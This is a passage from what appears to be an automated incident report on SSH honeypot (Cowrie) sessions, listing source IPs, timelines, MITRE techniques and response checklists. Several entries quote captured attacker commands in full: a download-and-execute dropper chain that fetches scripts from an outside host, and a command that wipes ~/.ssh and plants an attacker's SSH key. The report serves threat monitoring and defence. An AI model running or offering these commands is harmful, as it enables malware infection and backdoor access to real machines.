- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0471e7ebe588

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:41 |
| **Last Seen** | 2026-09-29 05:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:41:12` | `cowrie.session.connect` |
| `2026-09-29 05:41:12` | `cowrie.client.version` |
| `2026-09-29 05:41:13` | `cowrie.client.kex` |
| `2026-09-29 05:41:14` | `cowrie.login.success` |
| `2026-09-29 05:41:15` | `cowrie.session.params` |
| `2026-09-29 05:41:15` | `cowrie.command.input` |
| `2026-09-29 05:41:15` | `cowrie.log.closed` |
| `2026-09-29 05:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f175325fb61

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:41 |
| **Last Seen** | 2026-09-29 05:41 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:41:17` | `cowrie.session.connect` |
| `2026-09-29 05:41:17` | `cowrie.client.version` |
| `2026-09-29 05:41:17` | `cowrie.client.kex` |
| `2026-09-29 05:41:32` | `cowrie.login.success` |
| `2026-09-29 05:41:33` | `cowrie.session.params` |
| `2026-09-29 05:41:33` | `cowrie.command.input` |
| `2026-09-29 05:41:34` | `cowrie.log.closed` |
| `2026-09-29 05:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a25d273945

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:41 |
| **Last Seen** | 2026-09-29 05:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:41:39` | `cowrie.session.connect` |
| `2026-09-29 05:41:39` | `cowrie.client.version` |
| `2026-09-29 05:41:39` | `cowrie.client.kex` |
| `2026-09-29 05:41:41` | `cowrie.login.success` |
| `2026-09-29 05:41:42` | `cowrie.session.params` |
| `2026-09-29 05:41:42` | `cowrie.command.input` |
| `2026-09-29 05:41:43` | `cowrie.log.closed` |
| `2026-09-29 05:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b49da0b28a7

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:41 |
| **Last Seen** | 2026-09-29 05:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:41:43` | `cowrie.session.connect` |
| `2026-09-29 05:41:43` | `cowrie.client.version` |
| `2026-09-29 05:41:43` | `cowrie.client.kex` |
| `2026-09-29 05:41:44` | `cowrie.login.success` |
| `2026-09-29 05:41:45` | `cowrie.session.params` |
| `2026-09-29 05:41:45` | `cowrie.command.input` |
| `2026-09-29 05:41:46` | `cowrie.log.closed` |
| `2026-09-29 05:41:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98f434497768

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:41 |
| **Last Seen** | 2026-09-29 05:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:41:48` | `cowrie.session.connect` |
| `2026-09-29 05:41:48` | `cowrie.client.version` |
| `2026-09-29 05:41:48` | `cowrie.client.kex` |
| `2026-09-29 05:41:50` | `cowrie.login.success` |
| `2026-09-29 05:41:51` | `cowrie.session.params` |
| `2026-09-29 05:41:51` | `cowrie.command.input` |
| `2026-09-29 05:41:51` | `cowrie.log.closed` |
| `2026-09-29 05:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-457f1f10076d

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:41 |
| **Last Seen** | 2026-09-29 05:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:41:51` | `cowrie.session.connect` |
| `2026-09-29 05:41:51` | `cowrie.client.version` |
| `2026-09-29 05:41:51` | `cowrie.client.kex` |
| `2026-09-29 05:41:53` | `cowrie.login.success` |
| `2026-09-29 05:41:55` | `cowrie.session.params` |
| `2026-09-29 05:41:55` | `cowrie.command.input` |
| `2026-09-29 05:41:55` | `cowrie.log.closed` |
| `2026-09-29 05:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9378d69c32f8

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-29 05:55 |
| **Last Seen** | 2026-09-29 05:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:55:10` | `cowrie.session.connect` |
| `2026-09-29 05:55:10` | `cowrie.client.version` |
| `2026-09-29 05:55:11` | `cowrie.client.kex` |
| `2026-09-29 05:55:11` | `cowrie.login.success` |
| `2026-09-29 05:55:14` | `cowrie.direct-tcpip.request` |
| `2026-09-29 05:55:14` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 05:55:14` | `cowrie.direct-tcpip.data` |
| `2026-09-29 05:55:15` | `cowrie.direct-tcpip.request` |
| `2026-09-29 05:55:16` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 05:55:16` | `cowrie.direct-tcpip.data` |
| `2026-09-29 05:55:17` | `cowrie.direct-tcpip.request` |
| `2026-09-29 05:55:17` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 05:55:17` | `cowrie.direct-tcpip.data` |
| `2026-09-29 05:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a99616b3d969

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-29 06:09 |
| **Last Seen** | 2026-09-29 06:10 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:09:52` | `cowrie.session.connect` |
| `2026-09-29 06:09:52` | `cowrie.client.version` |
| `2026-09-29 06:09:53` | `cowrie.client.kex` |
| `2026-09-29 06:09:53` | `cowrie.login.success` |
| `2026-09-29 06:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fada4e43d9e2

| Field | Detail |
|---|---|
| **Source IP** | `34.62.45[.]78` |
| **First Seen** | 2026-09-29 06:10 |
| **Last Seen** | 2026-09-29 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:10:40` | `cowrie.session.connect` |
| `2026-09-29 06:10:40` | `cowrie.login.success` |
| `2026-09-29 06:10:41` | `cowrie.session.params` |
| `2026-09-29 06:10:41` | `cowrie.command.input` |
| `2026-09-29 06:10:41` | `cowrie.command.input` |
| `2026-09-29 06:10:41` | `cowrie.command.failed` |
| `2026-09-29 06:10:41` | `cowrie.command.input` |
| `2026-09-29 06:10:41` | `cowrie.log.closed` |
| `2026-09-29 06:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.45[.]78` to AbuseIPDB if not already reported
- [ ] Block `34.62.45[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48a9be7c342

| Field | Detail |
|---|---|
| **Source IP** | `34.62.45[.]78` |
| **First Seen** | 2026-09-29 06:10 |
| **Last Seen** | 2026-09-29 06:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:10:53` | `cowrie.session.connect` |
| `2026-09-29 06:10:53` | `cowrie.login.success` |
| `2026-09-29 06:10:54` | `cowrie.session.params` |
| `2026-09-29 06:10:54` | `cowrie.command.input` |
| `2026-09-29 06:10:54` | `cowrie.command.failed` |
| `2026-09-29 06:11:01` | `cowrie.log.closed` |
| `2026-09-29 06:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.45[.]78` to AbuseIPDB if not already reported
- [ ] Block `34.62.45[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81140dc8a9a

| Field | Detail |
|---|---|
| **Source IP** | `34.62.45[.]78` |
| **First Seen** | 2026-09-29 06:10 |
| **Last Seen** | 2026-09-29 06:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:10:55` | `cowrie.session.connect` |
| `2026-09-29 06:10:55` | `cowrie.login.success` |
| `2026-09-29 06:10:56` | `cowrie.session.params` |
| `2026-09-29 06:10:56` | `cowrie.command.input` |
| `2026-09-29 06:11:01` | `cowrie.log.closed` |
| `2026-09-29 06:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.45[.]78` to AbuseIPDB if not already reported
- [ ] Block `34.62.45[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b67964403af

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-29 06:17 |
| **Last Seen** | 2026-09-29 06:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh;curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh;busybox wget hxxp://213.232.114[.]14/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114[.]14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114[.]14 ftp1.sh ftp1.sh;sh ftp1.sh;rm -rf handshakebins.sh tftp1.sh` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:17:35` | `cowrie.session.connect` |
| `2026-09-29 06:17:35` | `cowrie.client.version` |
| `2026-09-29 06:17:36` | `cowrie.client.kex` |
| `2026-09-29 06:17:36` | `cowrie.login.success` |
| `2026-09-29 06:17:37` | `cowrie.session.params` |
| `2026-09-29 06:17:37` | `cowrie.command.input` |
| `2026-09-29 06:17:41` | `cowrie.session.file_download` |
| `2026-09-29 06:17:41` | `cowrie.session.file_download` |
| `2026-09-29 06:17:41` | `cowrie.session.file_download` |
| `2026-09-29 06:17:42` | `cowrie.session.file_download` |
| `2026-09-29 06:17:42` | `cowrie.session.file_download.failed` |
| `2026-09-29 06:17:45` | `cowrie.session.file_download` |
| `2026-09-29 06:17:47` | `cowrie.log.closed` |
| `2026-09-29 06:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4915ad46cb17

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-29 06:17 |
| **Last Seen** | 2026-09-29 06:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh;curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh;busybox wget hxxp://213.232.114[.]14/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114[.]14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114[.]14 ftp1.sh ftp1.sh;sh ftp1.sh;rm -rf handshakebins.sh tftp1.sh` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:17:44` | `cowrie.session.connect` |
| `2026-09-29 06:17:44` | `cowrie.client.version` |
| `2026-09-29 06:17:44` | `cowrie.client.kex` |
| `2026-09-29 06:17:44` | `cowrie.login.success` |
| `2026-09-29 06:17:45` | `cowrie.session.params` |
| `2026-09-29 06:17:45` | `cowrie.command.input` |
| `2026-09-29 06:17:45` | `cowrie.session.file_download` |
| `2026-09-29 06:17:45` | `cowrie.session.file_download` |
| `2026-09-29 06:17:55` | `cowrie.log.closed` |
| `2026-09-29 06:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd7039680767

| Field | Detail |
|---|---|
| **Source IP** | `91.231.218[.]149` |
| **First Seen** | 2026-09-29 06:37 |
| **Last Seen** | 2026-09-29 06:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:37:08` | `cowrie.session.connect` |
| `2026-09-29 06:37:08` | `cowrie.client.version` |
| `2026-09-29 06:37:08` | `cowrie.client.kex` |
| `2026-09-29 06:37:09` | `cowrie.login.success` |
| `2026-09-29 06:37:10` | `cowrie.session.params` |
| `2026-09-29 06:37:10` | `cowrie.command.input` |
| `2026-09-29 06:37:10` | `cowrie.command.failed` |
| `2026-09-29 06:37:10` | `cowrie.log.closed` |
| `2026-09-29 06:37:11` | `cowrie.session.params` |
| `2026-09-29 06:37:11` | `cowrie.command.input` |
| `2026-09-29 06:37:11` | `cowrie.session.file_download` |
| `2026-09-29 06:37:11` | `cowrie.log.closed` |
| `2026-09-29 06:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.231.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `91.231.218[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6697594a6c43

| Field | Detail |
|---|---|
| **Source IP** | `91.231.218[.]149` |
| **First Seen** | 2026-09-29 06:37 |
| **Last Seen** | 2026-09-29 06:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:37:11` | `cowrie.session.connect` |
| `2026-09-29 06:37:11` | `cowrie.client.version` |
| `2026-09-29 06:37:11` | `cowrie.client.kex` |
| `2026-09-29 06:37:12` | `cowrie.login.success` |
| `2026-09-29 06:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.231.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `91.231.218[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dba8ea10d2e

| Field | Detail |
|---|---|
| **Source IP** | `91.231.218[.]149` |
| **First Seen** | 2026-09-29 06:37 |
| **Last Seen** | 2026-09-29 06:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:37:12` | `cowrie.session.connect` |
| `2026-09-29 06:37:12` | `cowrie.client.version` |
| `2026-09-29 06:37:12` | `cowrie.client.kex` |
| `2026-09-29 06:37:13` | `cowrie.login.success` |
| `2026-09-29 06:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.231.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `91.231.218[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c596aaeb29d

| Field | Detail |
|---|---|
| **Source IP** | `106.38.205[.]224` |
| **First Seen** | 2026-09-29 06:37 |
| **Last Seen** | 2026-09-29 06:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:37:42` | `cowrie.session.connect` |
| `2026-09-29 06:37:42` | `cowrie.client.version` |
| `2026-09-29 06:37:42` | `cowrie.client.kex` |
| `2026-09-29 06:37:43` | `cowrie.login.success` |
| `2026-09-29 06:37:44` | `cowrie.session.params` |
| `2026-09-29 06:37:44` | `cowrie.command.input` |
| `2026-09-29 06:37:44` | `cowrie.command.failed` |
| `2026-09-29 06:37:44` | `cowrie.log.closed` |
| `2026-09-29 06:37:45` | `cowrie.session.params` |
| `2026-09-29 06:37:45` | `cowrie.command.input` |
| `2026-09-29 06:37:46` | `cowrie.session.file_download` |
| `2026-09-29 06:37:46` | `cowrie.log.closed` |
| `2026-09-29 06:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.38.205[.]224` to AbuseIPDB if not already reported
- [ ] Block `106.38.205[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd730bc2de3d

| Field | Detail |
|---|---|
| **Source IP** | `106.38.205[.]224` |
| **First Seen** | 2026-09-29 06:37 |
| **Last Seen** | 2026-09-29 06:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:37:46` | `cowrie.session.connect` |
| `2026-09-29 06:37:46` | `cowrie.client.version` |
| `2026-09-29 06:37:47` | `cowrie.client.kex` |
| `2026-09-29 06:37:48` | `cowrie.login.success` |
| `2026-09-29 06:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.38.205[.]224` to AbuseIPDB if not already reported
- [ ] Block `106.38.205[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72d32edeeb79

| Field | Detail |
|---|---|
| **Source IP** | `106.38.205[.]224` |
| **First Seen** | 2026-09-29 06:37 |
| **Last Seen** | 2026-09-29 06:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:37:48` | `cowrie.session.connect` |
| `2026-09-29 06:37:48` | `cowrie.client.version` |
| `2026-09-29 06:37:48` | `cowrie.client.kex` |
| `2026-09-29 06:37:50` | `cowrie.login.success` |
| `2026-09-29 06:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.38.205[.]224` to AbuseIPDB if not already reported
- [ ] Block `106.38.205[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387a6c6143ad

| Field | Detail |
|---|---|
| **Source IP** | `182.53.50[.]34` |
| **First Seen** | 2026-09-29 06:42 |
| **Last Seen** | 2026-09-29 06:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:42:53` | `cowrie.session.connect` |
| `2026-09-29 06:42:53` | `cowrie.client.version` |
| `2026-09-29 06:42:53` | `cowrie.client.kex` |
| `2026-09-29 06:42:55` | `cowrie.login.success` |
| `2026-09-29 06:42:56` | `cowrie.direct-tcpip.request` |
| `2026-09-29 06:42:56` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 06:42:56` | `cowrie.direct-tcpip.data` |
| `2026-09-29 06:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.50[.]34` to AbuseIPDB if not already reported
- [ ] Block `182.53.50[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e544eb4b5d18

| Field | Detail |
|---|---|
| **Source IP** | `66.228.40[.]100` |
| **First Seen** | 2026-09-29 06:44 |
| **Last Seen** | 2026-09-29 06:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:44:19` | `cowrie.session.connect` |
| `2026-09-29 06:44:19` | `cowrie.login.success` |
| `2026-09-29 06:44:19` | `cowrie.session.params` |
| `2026-09-29 06:44:19` | `cowrie.command.input` |
| `2026-09-29 06:44:19` | `cowrie.command.input` |
| `2026-09-29 06:44:19` | `cowrie.command.failed` |
| `2026-09-29 06:44:19` | `cowrie.command.input` |
| `2026-09-29 06:44:19` | `cowrie.command.failed` |
| `2026-09-29 06:44:19` | `cowrie.command.input` |
| `2026-09-29 06:44:19` | `cowrie.log.closed` |
| `2026-09-29 06:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.228.40[.]100` to AbuseIPDB if not already reported
- [ ] Block `66.228.40[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c68d7106442

| Field | Detail |
|---|---|
| **Source IP** | `94.182.168[.]135` |
| **First Seen** | 2026-09-29 06:44 |
| **Last Seen** | 2026-09-29 06:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
